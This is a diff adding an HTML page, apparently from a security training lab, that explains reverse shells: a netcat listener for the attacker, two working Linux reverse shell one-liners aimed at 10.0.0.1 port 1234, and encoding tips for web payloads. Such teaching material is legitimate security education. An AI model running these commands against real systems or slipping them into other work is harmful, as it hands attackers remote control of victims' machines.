@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="keywords" content="">
+	<meta name="description" content="">
+
+	<title>Reverse Shells</title>
+<!--
+Snapshot Template
+http://www.templatemo.com/tm-493-snapshot
+
+Zoom Slider
+https://vegas.jaysalvat.com/
+
+Caption Hover Effects
+http://tympanus.net/codrops/2013/06/18/caption-hover-effects/
+-->
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/bootstrap.min.css') }}">
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/animate.min.css') }}">
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/font-awesome.min.css') }}">
+  	<link rel="stylesheet" href="{{ url_for('assets',path='/css/component.css') }}">
+	
+    <link rel="stylesheet" href="{{ url_for('assets',path='/css/owl.theme.css') }}">
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/owl.carousel.css') }}">
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/vegas.min.css') }}">
+	<link rel="stylesheet" href="{{ url_for('assets',path='/css/style.css') }}">
+
+	<!-- Google web font  -->
+	<link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,300' rel='stylesheet' type='text/css'>
+	
+</head>
+<body id="top" data-spy="scroll" data-offset="50" data-target=".navbar-collapse">
+
+
+<!-- Preloader section -->
+
+<div class="preloader">
+     <div class="sk-spinner sk-spinner-pulse"></div>
+</div>
+
+
+<!-- Navigation section  -->
+
+  <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+
+      <div class="navbar-header">
+        <button class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="icon icon-bar"></span>
+          <span class="icon icon-bar"></span>
+          <span class="icon icon-bar"></span>
+        </button>
+        <a href="#top" class="navbar-brand smoothScroll">Reverse Shells</a>
+      </div>
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="#top" class="smoothScroll"><span>Home</span></a></li>
+            <li><a href="#attacker" class="smoothScroll"><span>Attacker</span></a></li>
+            <li><a href="#victim" class="smoothScroll"><span>Victim</span></a></li>
+            <li><a href="#tryitout" class="smoothScroll"><span>Try it out</span></a></li>
+          </ul>
+       </div>
+
+    </div>
+  </div>
+
+
+<!-- Home section -->
+
+<section id="home">
+  <div class="overlay"></div>
+  <div class="container">
+    <div class="row">
+
+      <div class="col-md-offset-1 col-md-10 col-sm-12 wow fadeInUp" data-wow-delay="0.3s">
+        <h1 class="wow fadeInUp" data-wow-delay="0.6s">Reverse Shells</h1>
+        <p class="wow fadeInUp" data-wow-delay="0.9s">After gaining <a rel="nofollow" href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">remote code execution</a> on a machine, you will likely want to get a <a rel="nofollow" href="https://en.wikipedia.org/wiki/Shell_(computing)">shell</a> to allow you to explore the machine in a comfortable environment.</p>
+        <a href="#attacker" class="smoothScroll btn btn-success btn-lg wow fadeInUp" data-wow-delay="1.2s">Learn more</a>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+
+<section id="attacker">
+<section id="squarePost">
+  <div class="container">
+    <div class="row">
+
+      <div class="col-md-9 col-sm-8 wow fadeInUp" data-wow-delay="0.2s">
+        <div class="squarePost-thumb">
+          <h1>Attacker</h1>
+          <p>As an attacker, you need a way to receive the reverse shell connection from the victim machine.</p>
+          <p>There are multiple ways to do this; one of the most popular is with <a href="https://linux.die.net/man/1/nc">netcat</a>; for example: <code>nc -lvnp 1234</code></code></p>
+          <h2>Arguments</h2>
+          <p><code>-l</code> = listen (we are waiting for something [the victim] to connect to our machine)</p>
+          <p><code>-n</code> = don't do a DNS lookup (often, victim machines won't have an associated DNS server so DNS lookups won't work and prolong the initial connection time)</p>
+          <p><code>-v</code> = verbose (show more output - shows when you get a connection)</p>
+          <p><code>-p 1234</code> = specify a port number to receive the connection on. This can be any port you want provided you don't have something running on that port already. If it's under 1024 you will likely have to run nc as root <span  style="white-space: nowrap;">(su root/sudo)</span></p>
+          <hr />
+          <p>There are other programs that can handle reverse shells, some have more advanced features (so you don't have to do them manually) such as: <a rel="nofollow" href="https://en.wikipedia.org/wiki/Port_forwarding">port forwarding</a>, <a rel="nofollow" href="https://en.wikipedia.org/wiki/File_transfer">file transfer </a> or <a rel="nofollow" href="https://www.ibm.com/docs/en/zos/2.2.0?topic=keyboard-escape-sequences-control-characters">control sequences</a> (like CTRL+C).</p>
+          <p>Some examples are: <a rel="nofollow" href="https://github.com/calebstewart/pwncat">pwncat</a>, <a rel="nofollow" href="https://www.offensive-security.com/metasploit-unleashed/binary-payloads/">metasploit</a>, <a rel="nofollow" href="https://github.com/xct/xc">xc</a> and  <a rel="nofollow" href="https://github.com/Fahrj/reverse-ssh">Reverse-SSH</a></p>
+        </div>
+      </div>
+
+      <div class="col-md-3 col-sm-4 wow fadeInUp squarePost-img" data-wow-delay="0.6s">
+        <img src="{{ url_for('assets',path='/images/about-img.jpg') }}" class="img-responsive " alt="attacker">
+      </div>
+
+      <div class="clearfix"></div>
+
+     
+
+    </div>
+  </div>
+</section>
+</section>
+
+
+<!-- About section -->
+<section id="victim">
+  <section id="squarePost">
+    <div class="container">
+      <div class="row">
+  
+        <div class="col-md-9 col-sm-8 wow fadeInUp" data-wow-delay="0.2s">
+          <div class="squarePost-thumb">
+            <h1>Victim</h1>
+       
+            <p>To trigger a reverse shell, a command needs to be ran on the victim machine, commonly done through vulnerabilities which allow for <a rel="nofollow" href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">Remote Code Execution</a>. Once you have command execution, it's usually a case of running a selection of different reverse shells to see which work. Some machines won't have Python installed, restrict /dev/tcp devices being created, etc.</p>
+            <p>You will often have to incorporate a command into your existing exploit however there are some common reverse shell commands that you can use most of the time found on <a rel="nofollow" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> or <a rel="nofollow" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a>.</p>
+            <p>The two that will often work (on Linux machines) are:
+              <ul>
+                <li>
+                  <code>bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'</code>
+                </li>
+                <li>
+                  <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f</code>
+                </li>
+              </ul>
+            </p>
+            <p>
+              These examples are for Linux operating systems, however reverse shells are not solely for Linux. Windows reverse shells commonly rely on uploading assisting programs such as nc64.exe and then running those with similar commands as Linux.
+            </p>
+            <p>
+              Look out for possible bad characters which are in the command which could cause it to fail. For example <code>&</code> may not work in a browser since it's used to pass parameters in a HTTP GET request. So you might need to encode your command or try a different one.
+            </p>
+
+          </div>
+        </div>
+  
+        <div class="col-md-3 col-sm-4 wow fadeInUp squarePost-img" data-wow-delay="0.6s">
+          <img src="{{ url_for('assets',path='/images/shell.gif') }}" class="img-responsive " alt="attacker">
+        </div>
+ 
+        <div class="clearfix"></div>
+
+  
+      </div>
+    </div>
+  </section>
+  </section>
+
+  <section id="tryitout" >
+  <section id="contact">
+    <div class="container" >
+      <div class="row">
+  
+        <div class="col-md-offset-2 col-md-8 col-sm-12 wow fadeInUp" data-wow-delay="0.3s">
+          <div class="section-title">
+            <h1>Try it out</h1>
+            <hr />
+            <p>You know what a reverse shell is, now it's time to have a go!</p>
+            <a href="/tryitout" class="smoothScroll btn btn-success btn-lg wow fadeInUp" data-wow-delay="1.2s">I want a reverse shell</a>
+          </div>
+        </div>
+        <div class="clearfix"></div>
+  
+      </div>
+    </div>
+  </section>
+</section>
+  
+
+<!-- Javascript  -->
+<script src="{{ url_for('assets',path='/js/jquery.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/bootstrap.min.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/vegas.min.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/modernizr.custom.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/toucheffects.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/owl.carousel.min.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/smoothscroll.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/wow.min.js') }}"></script>
+<script src="{{ url_for('assets',path='/js/custom.js') }}"></script>
+
+</body>
+</html>
